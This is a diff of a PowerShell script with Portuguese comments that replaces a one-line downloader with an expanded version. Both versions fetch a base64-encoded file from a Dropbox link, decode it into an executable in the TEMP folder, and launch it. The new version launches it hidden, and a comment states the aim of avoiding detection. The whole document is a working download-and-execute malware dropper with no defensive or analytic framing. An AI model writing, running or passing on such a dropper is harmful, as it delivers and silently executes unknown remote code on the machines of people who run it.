@@ -1,1 +1,25 @@
-(Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/q5jvhsl3ehgozh8ixswgb/output.txt?rlkey=6lgdz0alaj0iujw4pozukxc9t&st=5v3fo42q&dl=1" -OutFile "$env:TEMP\output.txt") -and ($b64 = Get-Content "$env:TEMP\output.txt" -Raw) -and ([IO.File]::WriteAllBytes("$env:TEMP\decoded.exe", [Convert]::FromBase64String($b64))) -and (Start-Process "$env:TEMP\decoded.exe")
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$headers = @{"User-Agent"="Windows"}
+$uri = "https://www.dropbox.com/scl/fi/q5jvhsl3ehgozh8ixswgb/output.txt?rlkey=6lgdz0alaj0iujw4pozukxc9t&st=5v3fo42q&dl=1"
+$outFile = "$env:TEMP\output.txt"
+$exeFile = "$env:TEMP\decoded.exe"
+
+# Baixar o arquivo com tratamento de erro
+if ((Invoke-WebRequest -Uri $uri -OutFile $outFile -Headers $headers -ErrorAction SilentlyContinue) -and (Test-Path $outFile)) {
+    try {
+        # Ler Base64 e decodificar
+        $b64 = Get-Content $outFile -Raw -Encoding UTF8
+        $bytes = [Convert]::FromBase64String($b64)
+        
+        # Salvar como .exe
+        [IO.File]::WriteAllBytes($exeFile, $bytes)
+        
+        # Executar o .exe com delay para evitar detecção
+        Start-Process $exeFile -WindowStyle Hidden
+        Write-Host "Arquivo executado com sucesso: $exeFile"
+    } catch {
+        Write-Host "Erro na decodificação/Execução: $_" -ForegroundColor Red
+    }
+} else {
+    Write-Host "Falha ao baixar o arquivo!" -ForegroundColor Red
+}
